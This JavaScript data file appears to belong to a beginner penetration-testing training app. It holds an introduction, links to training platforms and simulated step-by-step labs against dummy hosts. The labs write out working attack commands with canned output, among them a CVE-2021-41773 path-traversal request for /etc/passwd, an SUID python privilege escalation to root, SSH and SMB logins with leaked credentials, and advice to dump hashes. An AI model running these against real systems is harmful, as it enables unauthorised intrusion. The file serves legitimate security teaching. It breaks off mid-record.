/* Curated external learning, budget roadmaps, and interactive mini-lab data for Start Here (#/start).
 * All URLs verified live on 2026-04-20. Strictly uses generic dummy lab targets
 * (10.10.10.50, 10.10.10.60, 10.10.10.70, corp.local, svc_app, etc.) in all examples.
 */
(function (G) {
  'use strict';
  var OBOL = G.OBOL = G.OBOL || {};
  OBOL.RESOURCES = {
    verified: '2026-04-20',

    // Part 1 of "New To All This": High-level introduction to Ethical Hacking & OBOL.
    intro: [
      {
        title: '1. What Is Offensive Security (Ethical Hacking)?',
        color: '#06b6d4',
        ic: 'shield',
        badge: 'The Big Picture',
        body: 'Every website, file server, and corporate network is built by humans, and humans occasionally leave a digital door unlocked: a default password, an outdated service, or a private backup file left in a public folder. Offensive security (penetration testing) is the job of legally testing real systems to find and prove those weaknesses before a criminal does.'
      },
      {
        title: '2. How Do Beginners Practice Safely & Legally?',
        color: '#a855f7',
        ic: 'flag',
        badge: 'Capture The Flag (CTF)',
        body: 'You never practice on real websites. Instead, training platforms give you legal, disposable virtual computers called "boxes". You are given only the box\'s IP address (like 10.10.10.50), and your goal is to find a way in as a regular user (capturing local.txt) and then elevate your permissions to Administrator or root (capturing proof.txt).'
      },
      {
        title: '3. Where Does OBOL Fit In?',
        color: '#10b981',
        ic: 'compass',
        badge: 'Your Co-Pilot',
        body: 'Beginners usually get stuck staring at a blank terminal wondering "What command do I run next, and what does this output mean?". OBOL solves that: you copy a suggested command from OBOL, run it in your terminal, and paste the output back into OBOL. OBOL reads the output, extracts the facts, fills in your next commands, and coaches you all the way to root.'
      }
    ],

    // Part 2 of "New To All This": 5-stage box lifecycle in a wide 3+2 grid with full-spectrum colors.
    concepts: [
      {
        num: 'Stage 1',
        phase: 'Recon (Discovery)',
        color: '#06b6d4',
        ic: 'radar',
        q: 'What doors and windows exist on this machine?',
        body: 'Every computer listens on numbered network ports (1 to 65535) for services like web browsers (Port 80), SSH remote login (Port 22), or Windows file sharing (Port 445). Recon scans the target IP to see which ports answer.',
        goal: 'Map open TCP/UDP ports, software versions, and the operating system.',
        clue: 'Port 22 (OpenSSH) and Port 80 (Apache Web Server) are open on Ubuntu Linux.'
      },
      {
        num: 'Stage 2',
        phase: 'Enumeration (Inspection)',
        color: '#3b82f6',
        ic: 'search',
        q: 'Which open service was left unlocked or misconfigured?',
        body: 'Seeing an open port is just seeing a closed door; enumeration means turning the handle. You scan for hidden web folders, check if file shares allow anonymous read access, and inspect configuration files for leaked credentials.',
        goal: 'Uncover a concrete lead: a leaked password, a readable backup, or a vulnerable version.',
        clue: 'A forgotten /backup.txt file on the web server leaks username svc_app and password Winter2026!.'
      },
      {
        num: 'Stage 3',
        phase: 'Initial Foothold (First Shell)',
        color: '#a855f7',
        ic: 'terminal',
        q: 'How do I get my first command prompt on the target?',
        body: 'Using the weakness from Stage 2 (logging in with the leaked password, uploading a script, or running an exploit), you get the target machine to execute commands for you as a standard, low-privilege user.',
        goal: 'Land an interactive shell on the box and capture the user flag (local.txt).',
        clue: 'You log into SSH as svc_app and read /home/svc_app/local.txt.'
      },
      {
        num: 'Stage 4',
        phase: 'Privilege Escalation (Root / SYSTEM)',
        color: '#f43f5e',
        ic: 'zap',
        q: 'How do I climb from a regular user to Administrator or root?',
        body: 'Standard users cannot read administrator files. Privilege escalation (PrivEsc) searches inside the machine for a local misconfiguration (like a privileged SUID binary, a scheduled task, or a service token) that lets you become root or SYSTEM.',
        goal: 'Elevate from a low-privilege account to full root (Linux) or SYSTEM (Windows).',
        clue: 'A misconfigured SUID binary or SeImpersonatePrivilege spawns a root/SYSTEM shell.'
      },
      {
        num: 'Stage 5',
        phase: 'Loot, Proof & Pivot (Completion)',
        color: '#f59e0b',
        ic: 'flag',
        q: 'Did I capture the proof and did this host unlock another machine?',
        body: 'As root or SYSTEM, you capture proof.txt, verify your terminal shows whoami + IP address + flag for your report, and dump any stored password hashes in case they unlock another computer on the network.',
        goal: 'Record proof.txt with verification output and harvest credentials for lateral movement.',
        clue: 'Both flags are logged in OBOL, and dumped hashes unlock the next target.'
      }
    ],

    // Interactive Budget-Based Starting Roadmaps (replaces plain bullets and duplicate courses grid).
    // Each tier has an exact 4-step progression so the 4-column desktop grid and 2-column tablet grid are always 100% symmetrical.
    budgetTiers: [
      {
        id: 'free',
        badge: '$0 Budget',
        title: '100% Free Forever Path',
        color: '#10b981',
        sub: 'Zero credit card and zero local VM setup required on day one. Click any step below to launch it directly in your browser or over free SSH:',
        steps: [
          {
            step: 'Step 1',
            name: 'OBOL Interactive Mini-Lab Simulator',
            cost: '100% Free (Built-In)',
            color: '#10b981',
            badge: 'Start Right Here',
            blurb: 'Test-drive a 4-phase compromise (Recon, Enumeration, Foothold, and PrivEsc) on simulated Linux, Windows, and Active Directory targets right in your browser.',
            switchTrack: 'minilab',
            actionLabel: 'Launch OBOL Mini-Lab'
          },
          {
            step: 'Step 2',
            name: 'OverTheWire: Bandit + TryHackMe Starter Rooms',
            cost: '100% Free forever',
            color: '#06b6d4',
            badge: 'Linux & Networking Basics',
            blurb: 'Never used the Linux command line or SSH? Bandit (Levels 0 to 15) and TryHackMe\'s free starter rooms teach file navigation, permissions, and networking in your browser.',
            url: 'https://overthewire.org/wargames/bandit/',
            actionLabel: 'Play Bandit Wargame'
          },
          {
            step: 'Step 3',
            name: 'PortSwigger Web Security Academy',
            cost: '100% Free forever',
            color: '#a855f7',
            badge: '250+ Free Web Labs',
            blurb: 'The industry gold standard for web vulnerabilities (SQLi, XSS, SSRF, XXE, JWT, SSTI, Deserialization). Every topic includes clear lessons and free live browser labs.',
            url: 'https://portswigger.net/web-security',
            actionLabel: 'Open PortSwigger Academy'
          },
          {
            step: 'Step 4',
            name: 'OBOL Study Coach + OffSec PG Play',
            cost: '100% Free (3 hrs/day VPN Labs)',
            color: '#f59e0b',
            badge: 'Full Box Practice',
            blurb: 'Pair OBOL\'s built-in Study tracks (#/study) with a free VirtualBox Kali VM, VulnHub offline machines, and OffSec Proving Grounds Play (3 free hours/day).',
            href: '#/study',
            actionLabel: 'Open OBOL Study Coach'
          }
        ]
      },
      {
        id: 'sub',
        badge: '$8 - $20 / month',
        title: 'Guided Student & Hobbyist Path',
        color: '#a855f7',
        sub: 'Best value if you have a small monthly budget and want structured curricula, unlimited browser terminals, and retired machines with official writeups:',
        steps: [
          {
            step: 'Step 1',
            name: 'TryHackMe Premium Learning Paths',
            cost: '~$14/mo (or ~$8/mo Student)',
            color: '#06b6d4',
            badge: 'Guided Curricula + AttackBox',
            blurb: 'Complete the "Complete Beginner", "Jr Penetration Tester", and "Offensive Pentesting" paths with unlimited browser AttackBox time and guided step-by-step questions.',
            url: 'https://tryhackme.com/r/hacktivities',
            actionLabel: 'Explore TryHackMe Paths'
          },
          {
            step: 'Step 2',
            name: 'HTB Academy (Penetration Tester Path)',
            cost: 'Student ~$8/mo (.edu); Silver ~$18/mo',
            color: '#a855f7',
            badge: 'Deep Technical Modules',
            blurb: 'Structured, deep-dive modules covering Nmap, Web Exploitation, Active Directory, Pivoting, and PrivEsc with live target assessments at the end of every section.',
            url: 'https://academy.hackthebox.com/',
            actionLabel: 'Open HTB Academy'
          },
          {
            step: 'Step 3',
            name: 'OBOL Study Coach & Command Builder',
            cost: 'Included Free in OBOL',
            color: '#3b82f6',
            badge: 'Interactive Drill Mode',
            blurb: 'As you finish each module in TryHackMe or HTB Academy, open OBOL Study (#/study) to inspect flag-by-flag command breakdowns and test your recall in Practice mode.',
            href: '#/study',
            actionLabel: 'Open OBOL Study (#/study)'
          },
          {
            step: 'Step 4',
            name: 'Hack The Box VIP+ or OffSec PG Practice',
            cost: 'HTB VIP+ ~$20/mo; PG Practice ~$19/mo',
            color: '#10b981',
            badge: 'Retired Boxes + Writeups',
            blurb: 'Pair OBOL with 30+ retired Easy and Medium Linux, Windows, and Active Directory boxes. Studying retired boxes lets you check official writeups whenever you get stuck.',
            url: 'https://www.hackthebox.com/',
            actionLabel: 'Open Hack The Box Labs'
          }
        ]
      },
      {
        id: 'cert',
        badge: 'Cert & Career Track',
        title: 'Certification & Employer-Funded Path',
        color: '#f59e0b',
        sub: 'Ready to earn a recognized hands-on certification for your resume or allocate an employer training budget:',
        steps: [
          {
            step: 'Step 1',
            name: 'TCM Security Academy (PEH) + PNPT Exam',
            cost: '~$30/mo All-Access + ~$499 Exam',
            color: '#10b981',
            badge: 'Best First Hands-On Cert',
            blurb: 'Practical Ethical Hacking (PEH) teaches networking, web, and building your own Active Directory home lab, preparing you for the 5-day PNPT exam (zero CTF tricks).',
            url: 'https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course',
            actionLabel: 'Open TCM Academy'
          },
          {
            step: 'Step 2',
            name: 'HTB Academy + CPTS Certification',
            cost: '~$490 Exam Voucher + Academy Sub',
            color: '#a855f7',
            badge: 'Deepest Technical Curriculum',
            blurb: 'Completing the 28-module Penetration Tester Job Role Path prepares you for the 10-day CPTS exam: a connected multi-forest enterprise network and commercial report.',
            url: 'https://academy.hackthebox.com/',
            actionLabel: 'Explore CPTS Track'
          },
          {
            step: 'Step 3',
            name: 'OffSec PEN-200 (OSCP) or SANS SEC560 (GPEN)',
            cost: '~$1,749+ OSCP (or Employer GPEN)',
            color: '#f43f5e',
            badge: 'HR & Enterprise Standard',
            blurb: 'OffSec\'s PEN-200 and Challenge Labs prepare you for the 24-hour proctored OSCP exam (or pair with SANS SEC560 / GIAC GPEN when an employer or GI Bill covers tuition).',
            url: 'https://www.offsec.com/courses/pen-200/',
            actionLabel: 'Open OffSec PEN-200'
          },
          {
            step: 'Step 4',
            name: 'OBOL Certification Exam Playbooks',
            cost: 'Included Free in OBOL',
            color: '#06b6d4',
            badge: 'Exam Strategy & Sim',
            blurb: 'Compare passing score math, banned-tool rules, exam-day OBOL workflows, and launch a one-click Mock Exam Engagement for OSCP, CPTS, or PNPT.',
            switchTrack: 'exam',
            actionLabel: 'Open Exam Playbooks'
          }
        ]
      }
    ],

    // Interactive Multi-Step Guided Mini-Labs (Door 1: Try A Guided Mini-Lab).
    // Phase 1 starts with a SINGLE Move Card (Nmap) just like real OBOL on a cold IP,
    // with dynamic hand-drawn SVG arrows guiding Copy -> Paste in Terminal -> Copy Output -> Paste in OBOL.
    // Phases 2-4 present 3 plausible Move Cards (1 command each):
    //   - kind: 'deadend' -> yields no useful lead; OBOL explains why and suppresses/retires the card!
    //   - kind: 'doctor'  -> hits a realistic error; OBOL's Field Doctor diagnoses it and shows the fix!
    //   - kind: 'advance' -> mints the key facts, shows Pause & Explain, and advances to the next phase!
    miniLabs: [
      {
        id: 'linux-web',
        title: 'Mini-Lab 1: Linux Web Server to Root',
        badge: 'Beginner Friendly',
        color: '#10b981',
        os: 'Linux (Ubuntu)',
        target: '10.10.10.50',
        hostname: 'web01.corp.local',
        summary: 'Start with only an IP address (10.10.10.50). Run Nmap, test three plausible enumeration moves on Port 80, log in over SSH, and escalate to root via SUID.',
        steps: [
          {
            phase: 'Phase 1 of 4: Recon',
            title: 'Scan the Cold Target (10.10.10.50)',
            prompt: 'Just like a real engagement, you start with only an IP address (10.10.10.50). Because OBOL does not know which ports are open yet, it surfaces a single opening Move Card: Nmap Service & Script Scan. Follow the hand-drawn arrows below to copy the command, run it in the terminal, and paste the output back into OBOL!',
            knownFacts: ['target: 10.10.10.50'],
            cards: [
              {
                id: 'nmap-std',
                rank: '#1',
                color: '#06b6d4',
                title: 'Nmap TCP Service & Default Script Scan',
                why: 'Probes common TCP ports, fingerprints running service versions (-sV), and runs safe default discovery scripts (-sC).',
                fieldNote: '-sC runs Nmap default scripts (HTTP titles, SMB/SSH banners) | -sV probes open ports for exact software versions | -Pn skips ping check in case a firewall blocks ICMP.',
                cmd: 'nmap -sC -sV -Pn 10.10.10.50',
                kind: 'advance',
                terminalOutput:
                  'Starting Nmap 7.94SVN ( https://nmap.org )\n' +
                  'Nmap scan report for web01.corp.local (10.10.10.50)\n' +
                  'Host is up (0.028s latency).\n' +
                  'Not shown: 998 closed tcp ports (reset)\n' +
                  'PORT   STATE SERVICE VERSION\n' +
                  '22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n' +
                  '80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n' +
                  '|_http-title: Corp Internal Portal - Login\n' +
                  '|_http-server-header: Apache/2.4.52 (Ubuntu)\n' +
                  'Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n' +
                  'Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds',
                mintedFacts: [
                  { kind: 'ports.open', detail: '22/tcp (ssh), 80/tcp (http)' },
                  { kind: 'host.os_family', detail: 'Linux (Ubuntu)' },
                  { kind: 'http.reachable', detail: 'http://10.10.10.50 (Apache 2.4.52)' },
                  { kind: 'host.hostname', detail: 'web01.corp.local' }
                ],
                explain: {
                  whatHappened: 'Nmap probed 10.10.10.50 and discovered two open TCP ports: Port 22 (OpenSSH 8.9p1) and Port 80 (Apache 2.4.52) on Ubuntu Linux.',
                  howObolHelped: 'As soon as you pasted the scan output, OBOL minted 4 facts, set the target OS to Linux (filtering out all Windows-only moves), and unlocked 3 plausible next moves for Port 80 and Port 22!',
                  featureSpotlight: 'Paste-Driven Ranking: You never fill out forms in OBOL. Pasting raw terminal output updates your target profile and re-ranks the Cockpit automatically.'
                }
              }
            ]
          },
          {
            phase: 'Phase 2 of 4: Enumeration',
            title: 'Inspect Port 80 & Port 22 (3 Plausible Moves)',
            prompt: 'Based on your Nmap scan, OBOL now surfaces 3 plausible Move Cards. Try any of them! If a move yields nothing useful, OBOL will rule it out and suppress the card; if it hits an error, OBOL\'s Field Doctor will diagnose it; and when you find the leaked credential, OBOL will advance to Phase 3.',
            knownFacts: ['ports.open: 22, 80', 'host.os_family: Linux (Ubuntu)', 'http.reachable: :80'],
            cards: [
              {
                id: 'ffuf-dir',
                rank: '#1',
                color: '#10b981',
                title: 'Web Directory & Backup Fuzzing (ffuf)',
                why: 'Fuzzes Port 80 for hidden directories, staging folders, and leftover backup files (.bak, .txt, .zip) using SecLists.',
                fieldNote: '-u specifies target URL with FUZZ keyword | -w selects wordlist | -mc 200,301 filters output to existing pages and redirects.',
                cmd: 'ffuf -u http://10.10.10.50/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,301 && curl -s http://10.10.10.50/backup.txt',
                kind: 'advance',
                terminalOutput:
                  'login.php               [Status: 200, Size: 1842, Words: 190, Lines: 48]\n' +
                  'assets                  [Status: 301, Size: 312, Words: 20, Lines: 10]\n' +
                  'backup.txt              [Status: 200, Size: 148, Words: 18, Lines: 5]\n' +
                  '--- Contents of http://10.10.10.50/backup.txt ---\n' +
                  '# Portal maintenance note\n' +
                  'SSH deployment account migrated:\n' +
                  'username: svc_app\n' +
                  'password: Winter2026!',
                mintedFacts: [
                  { kind: 'web.paths', detail: '/login.php (200), /assets (301), /backup.txt (200)' },
                  { kind: 'credential.available', detail: 'svc_app : Winter2026! (plaintext)' }
                ],
                explain: {
                  whatHappened: 'Directory fuzzing with ffuf uncovered `/backup.txt`, which contained a cleartext maintenance credential (`svc_app : Winter2026!`).',
                  howObolHelped: 'OBOL parsed `svc_app` and `Winter2026!`, added the credential to your CredBar, and automatically pre-filled `{{user}}` and `{{password}}` in every Phase 3 foothold command!',
                  featureSpotlight: 'Automatic Token Injection: Notice how in Phase 3, your SSH and web commands already have `svc_app` and `Winter2026!` filled in.'
                }
              },
              {
                id: 'robots-headers',
                rank: '#2',
                color: '#3b82f6',
                title: 'Inspect HTTP Headers & robots.txt (curl)',
                why: 'Quick check to see if response headers or /robots.txt disclose hidden admin paths or framework versions.',
                fieldNote: '-s runs silent | -i includes HTTP response headers in the output.',
                cmd: 'curl -si http://10.10.10.50/robots.txt',
                kind: 'deadend',
                terminalOutput:
                  'HTTP/1.1 404 Not Found\n' +
                  'Date: Mon, 20 Apr 2026 18:05:11 GMT\n' +
                  'Server: Apache/2.4.52 (Ubuntu)\n' +
                  'Content-Length: 274\n' +
                  'Content-Type: text/html; charset=iso-8859-1\n\n' +
                  '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n' +
                  '<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL /robots.txt was not found on this server.</p></body></html>',
                suppressNote: 'Checked & Ruled Out: `/robots.txt` returned 404 Not Found and the headers showed only standard Apache/2.4.52. OBOL records that you checked this and suppresses the card so your screen stays focused on the remaining moves!'
              },
              {
                id: 'ssh-banner-probe',
                rank: '#3',
                color: '#f59e0b',
                title: 'Attempt Unauthenticated SSH Login Check',
                why: 'Tests whether SSH allows empty passwords or leaks an authentication banner before credentials are known.',
                fieldNote: '-o PreferredAuthentications=password forces password prompt to check banner response.',
                cmd: 'ssh -o PreferredAuthentications=password admin@10.10.10.50',
                kind: 'doctor',
                terminalOutput:
                  'admin@10.10.10.50\'s password:\n' +
                  'Permission denied, please try again.\n' +
                  'admin@10.10.10.50: Permission denied (publickey,password).',
                doctor: {
                  title: 'Field Doctor: SSH Requires Valid Credentials First',
                  diagnosis: 'OpenSSH 8.9p1 rejected the login because we do not have a valid username or password yet, and OpenSSH is not vulnerable to authentication bypass.',
                  fix: 'OBOL suppresses unauthenticated SSH guesses until a credential is found. Run Card #1 (`ffuf` web directory fuzzing on Port 80) to hunt for leaked credentials!'
                }
              }
            ]
          },
          {
            phase: 'Phase 3 of 4: Initial Foothold',
            title: 'Turn svc_app:Winter2026! Into a Shell (3 Plausible Moves)',
            prompt: 'OBOL now holds a valid credential (`svc_app : Winter2026!`) and sees both Port 22 (SSH) and Port 80 (`/login.php`) open. Test the 3 candidate moves below to land your initial foothold and capture `local.txt`.',
            knownFacts: ['ports.open: 22, 80', 'credential.available: svc_app:Winter2026!'],
            cards: [
              {
                id: 'ssh-foothold',
                rank: '#1',
                color: '#10b981',
                title: 'SSH Login With Discovered Credentials',
                why: 'Tests whether the leaked backup credential (`svc_app : Winter2026!`) grants direct interactive SSH access on Port 22.',
                fieldNote: 'sshpass -p supplies the password non-interactively | id && hostname && cat local.txt verifies shell identity and grabs the user flag.',
                cmd: 'sshpass -p \'Winter2026!\' ssh svc_app@10.10.10.50 "id && hostname && cat /home/svc_app/local.txt"',
                kind: 'advance',
                terminalOutput:
                  'uid=1001(svc_app) gid=1001(svc_app) groups=1001(svc_app)\n' +
                  'web01\n' +
                  'a1b2c3d4e5f60718293a4b5c6d7e8f90',
                mintedFacts: [
                  { kind: 'ssh.authenticated', detail: 'svc_app@10.10.10.50' },
                  { kind: 'foothold.linux', detail: 'Shell access as uid=1001(svc_app)' },
                  { kind: 'objective.local_flag', detail: 'a1b2c3d4e5f60718293a4b5c6d7e8f90 (/home/svc_app/local.txt)' }
                ],
                explain: {
                  whatHappened: '`svc_app : Winter2026!` logged straight into SSH on Port 22! You now have a Linux user shell on `web01` and captured `local.txt`.',
                  howObolHelped: 'When OBOL saw `uid=1001(svc_app)` and the 32-hex flag, it marked Initial Foothold complete, logged `local.txt`, retired all initial-foothold web cards, and pivoted your Cockpit view to Linux Privilege Escalation.',
                  featureSpotlight: 'Move Retirement: Once you have a shell, OBOL automatically retires initial-foothold guesses so your workbench stays clutter-free.'
                }
              },
              {
                id: 'web-login-portal',
                rank: '#2',
                color: '#3b82f6',
                title: 'Test Credentials Against /login.php',
                why: 'Checks if `svc_app : Winter2026!` logs into the web portal on Port 80.',
                fieldNote: '-X POST sends form data (-d) to /login.php.',
                cmd: 'curl -s -X POST http://10.10.10.50/login.php -d "username=svc_app&password=Winter2026!"',
                kind: 'deadend',
                terminalOutput:
                  '<html><body><div class="alert">Welcome svc_app! Notice: Portal file manager is currently read-only during maintenance. Use SSH for deployments.</div></body></html>',
                suppressNote: 'Checked & Ruled Out: `/login.php` accepted the login, but the portal is a static read-only status page with no file upload or command execution. OBOL suppresses this web card and points you to Card #1 (SSH Login on Port 22)!'
              },
              {
                id: 'apache-cve-check',
                rank: '#3',
                color: '#f59e0b',
                title: 'Test Apache 2.4.49 Path Traversal (CVE-2021-41773)',
                why: 'Probes whether Apache is vulnerable to the 2.4.49/2.4.50 CGI path traversal exploit.',
                fieldNote: '--path-as-is prevents curl from normalizing ../ sequences before sending.',
                cmd: 'curl -s --path-as-is "http://10.10.10.50/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"',
                kind: 'doctor',
                terminalOutput:
                  '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n' +
                  '<html><head><title>400 Bad Request</title></head><body><h1>Bad Request</h1></body></html>',
                doctor: {
                  title: 'Field Doctor: Target Runs Apache 2.4.52 (Patched Against CVE-2021-41773)',
                  diagnosis: 'CVE-2021-41773 only affects Apache 2.4.49 and 2.4.50. Your Nmap scan showed Apache 2.4.52, and you already have a valid password (`svc_app : Winter2026!`)!',
                  fix: 'Do not fire public CVEs when you have valid credentials. Use Card #1 (`ssh svc_app@10.10.10.50`) to log in cleanly.'
                }
              }
            ]
          },
          {
            phase: 'Phase 4 of 4: Privilege Escalation & Proof',
            title: 'Escalate From svc_app to root (3 Plausible Moves)',
            prompt: 'You are logged into `web01` as `svc_app` (non-root). OBOL now surfaces the 3 core Linux Privilege Escalation checks: sudo privileges, SUID binaries, and cron jobs. Work through them to become `root` and capture `/root/proof.txt`!',
            knownFacts: ['foothold.linux: svc_app', 'objective.local_flag: captured'],
            cards: [
              {
                id: 'suid-privesc',
                rank: '#1',
                color: '#10b981',
                title: 'Audit SUID Binaries & Escalate via GTFOBins',
                why: 'Searches for root-owned binaries with the SUID bit (-perm -4000) that allow spawning a privileged root shell.',
                fieldNote: 'find / -perm -4000 locates SUID files | python3 -c os.execl("/bin/sh", "sh", "-p") preserves effective UID 0 (root).',
                cmd: 'find / -perm -4000 -type f 2>/dev/null && /usr/bin/python3.10 -c \'import os; os.execl("/bin/sh", "sh", "-p", "-c", "id && hostname && ip -4 a show eth0 && cat /root/proof.txt")\'',
                kind: 'advance',
                terminalOutput:
                  '/usr/bin/passwd\n' +
                  '/usr/bin/sudo\n' +
                  '/usr/bin/python3.10\n' +
                  'uid=1001(svc_app) gid=1001(svc_app) euid=0(root) groups=1001(svc_app)\n' +
                  'web01\n' +
                  '2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP\n' +
                  '    inet 10.10.10.50/24 brd 10.10.10.255 scope global eth0\n' +
                  'f0e1d2c3b4a5968778695a4b3c2d1e0f',
                mintedFacts: [
                  { kind: 'privesc.suid_candidate', detail: '/usr/bin/python3.10 (GTFOBins SUID)' },
                  { kind: 'access.root', detail: 'euid=0(root) achieved on web01' },
                  { kind: 'objective.root_flag', detail: 'f0e1d2c3b4a5968778695a4b3c2d1e0f (/root/proof.txt)' }
                ],
                explain: {
                  whatHappened: '`find / -perm -4000` found `/usr/bin/python3.10` with the SUID bit set! Running Python with `-p` kept `euid=0(root)` and printed `id`, `ip a`, and `/root/proof.txt`.',
                  howObolHelped: 'OBOL automatically matches every SUID binary in your `find` or `linpeas` output against GTFOBins and hands you the exact root command.',
                  featureSpotlight: 'Box Complete & Report Preflight: Both `local.txt` and `proof.txt` (with `id` + IP address) are now verified and ready for export in `#/report`!'
                }
              },
              {
                id: 'sudo-check',
                rank: '#2',
                color: '#f59e0b',
                title: 'Check Sudo Privileges (sudo -l)',
                why: 'Checks if `svc_app` is allowed to run any commands as root via /etc/sudoers.',
                fieldNote: 'sudo -S reads password from stdin | -l lists allowed sudo commands for the current user.',
                cmd: 'echo Winter2026! | sudo -S -l',
                kind: 'doctor',
                terminalOutput:
                  '[sudo] password for svc_app: \n' +
                  'Sorry, user svc_app may not run sudo on web01.',
                doctor: {
                  title: 'Field Doctor: User svc_app May Not Run Sudo',
                  diagnosis: '`sudo -l` is always the right first check on Linux, and here it confirmed `svc_app` has no sudoers entries on `web01`.',
                  fix: 'OBOL retires `sudo` attacks for this user and highlights Card #1 (`find / -perm -4000` SUID Binary Check)!'
                }
              },
              {
                id: 'cron-check',
                rank: '#3',
                color: '#3b82f6',
                title: 'Inspect System Cron Jobs (/etc/crontab)',
                why: 'Checks whether root is running any scheduled scripts that `svc_app` can edit or hijack.',
                fieldNote: 'Reads /etc/crontab and /etc/cron.d/ to spot custom root scheduled tasks.',
                cmd: 'cat /etc/crontab && ls -la /etc/cron.d/',
                kind: 'deadend',
                terminalOutput:
                  'SHELL=/bin/sh\n' +
                  'PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n' +
                  '# m h dom mon dow user  command\n' +
                  '17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n' +
                  'total 12\n' +
                  '-rw-r--r-- 1 root root 102 Apr 20 12:00 e2scrub_all',
                suppressNote: 'Checked & Ruled Out: `/etc/crontab` only contains default Ubuntu system maintenance jobs owned and writable solely by root. OBOL suppresses this card so you can focus on SUID binaries (Card #1)!'
              }
            ]
          }
        ]
      },
      {
        id: 'windows-smb',
        title: 'Mini-Lab 2: Windows File Server to SYSTEM',
        badge: 'OSCP / PNPT Core',
        color: '#3b82f6',
        os: 'Windows Server 2022',
        target: '10.10.10.60',
        hostname: 'files01.corp.local',
        summary: 'Start with a cold Windows IP (10.10.10.60). Scan with Nmap, enumerate SMB shares, gain a WinRM shell, and escalate via SeImpersonatePrivilege.',
        steps: [
          {
            phase: 'Phase 1 of 4: Recon',
            title: 'Scan the Cold Target (10.10.10.60)',
            prompt: 'You have a new target IP: 10.10.10.60. Copy the opening Nmap scan from the Move Card, run it in the emulated terminal, and paste the output back into OBOL.',
            knownFacts: ['target: 10.10.10.60'],
            cards: [
              {
                id: 'nmap-win',
                rank: '#1',
                color: '#06b6d4',
                title: 'Nmap TCP Service & Default Script Scan',
                why: 'Discovers open ports and fingerprints Windows SMB/RPC/WinRM services.',
                fieldNote: '-sC runs default scripts (including smb2-security-mode) | -sV fingerprints service versions | -Pn skips ping.',
                cmd: 'nmap -sC -sV -Pn 10.10.10.60',
                kind: 'advance',
                terminalOutput:
                  'Starting Nmap 7.94SVN ( https://nmap.org )\n' +
                  'Nmap scan report for files01.corp.local (10.10.10.60)\n' +
                  'Host is up (0.031s latency).\n' +
                  'PORT     STATE SERVICE       VERSION\n' +
                  '135/tcp  open  msrpc         Microsoft Windows RPC\n' +
                  '139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n' +
                  '445/tcp  open  microsoft-ds? \n' +
                  '5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n' +
                  'Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n' +
                  'Host script results:\n' +
                  '| smb2-security-mode:\n' +
                  '|   3:1:1:\n' +
                  '|_    Message signing enabled but not required',
                mintedFacts: [
                  { kind: 'ports.open', detail: '135/tcp, 139/tcp, 445/tcp (SMB), 5985/tcp (WinRM)' },
                  { kind: 'host.os_family', detail: 'Windows' },
                  { kind: 'smb.reachable', detail: '445/tcp Microsoft SMB' },
                  { kind: 'winrm.reachable', detail: '5985/tcp Windows Remote Management' }
                ],
                explain: {
                  whatHappened: 'Nmap identified a Windows Server exposing MSRPC (135), SMB file sharing (445), and WinRM remote management (5985).',
                  howObolHelped: 'OBOL recognized Port 5985 as WinRM (even though Nmap prints `Microsoft HTTPAPI httpd 2.0`) and unlocked 3 plausible Windows enumeration moves!',
                  featureSpotlight: 'Port 5985 Fingerprint: OBOL never confuses WinRM on 5985 with a normal website.'
                }
              }
            ]
          },
          {
            phase: 'Phase 2 of 4: Enumeration',
            title: 'Enumerate SMB & RPC (3 Plausible Moves)',
            prompt: 'OBOL sees SMB (445) and MSRPC (135) open with no credentials yet. Test the 3 candidate enumeration cards below.',
            knownFacts: ['host.os_family: Windows', 'smb.reachable: 445/tcp', 'winrm.reachable: 5985/tcp'],
            cards: [
              {
                id: 'smbclient-null',
                rank: '#1',
                color: '#10b981',
                title: 'Anonymous SMB Share Listing & File Inspection (smbclient)',
                why: 'Lists SMB shares using a null session (-N) and inspects readable non-default shares for scripts or configs.',
                fieldNote: '-N connects without a password | -L lists shares | -c "get deploy.ps1 -" prints the file to stdout.',
                cmd: 'smbclient -N -L //10.10.10.60 && smbclient -N //10.10.10.60/IT_Backups -c "get deploy.ps1 -"',
                kind: 'advance',
                terminalOutput:
                  '        Sharename       Type      Comment\n' +
                  '        ---------       ----      -------\n' +
                  '        ADMIN$          Disk      Remote Admin\n' +
                  '        C$              Disk      Default share\n' +
                  '        IPC$            IPC       Remote IPC\n' +
                  '        IT_Backups      Disk      Staging scripts\n' +
                  '# --- deploy.ps1 ---\n' +
                  '$user = "corp.local\\svc_deploy"\n' +
                  '$pass = ConvertTo-SecureString "Deploy#2026!" -AsPlainText -Force',
                mintedFacts: [
                  { kind: 'smb.shares', detail: 'ADMIN$, C$, IPC$, IT_Backups' },
                  { kind: 'smb.readable_share', detail: 'IT_Backups (non-default share)' },
                  { kind: 'credential.available', detail: 'corp.local\\svc_deploy : Deploy#2026!' }
                ],
                explain: {
                  whatHappened: 'Anonymous SMB listed a custom `IT_Backups` share containing `deploy.ps1`, which leaked `corp.local\\svc_deploy : Deploy#2026!`.',
                  howObolHelped: 'OBOL extracted the PowerShell credential and unlocked authenticated WinRM and SMB moves for Phase 3.',
                  featureSpotlight: 'Config & Script Parser: OBOL automatically extracts credentials from PowerShell scripts, web.config, and .env files.'
                }
              },
              {
                id: 'rpcclient-null',
                rank: '#2',
                color: '#3b82f6',
                title: 'Anonymous RPC User Enumeration (rpcclient)',
                why: 'Checks if the MSRPC endpoint allows anonymous user listing via enumdomusers.',
                fieldNote: '-U "" -N attempts an anonymous null session bind over SMB pipe.',
